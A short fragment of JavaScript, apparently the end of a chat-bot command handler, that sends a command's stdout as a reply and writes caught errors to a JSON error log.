      reply(stdout)
      }
      })
      }
  } catch (err) {
    console.log(color('[ERROR]', 'red'), err)
    server_eror.push({ "error": `${err}` })
    fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
  }
}
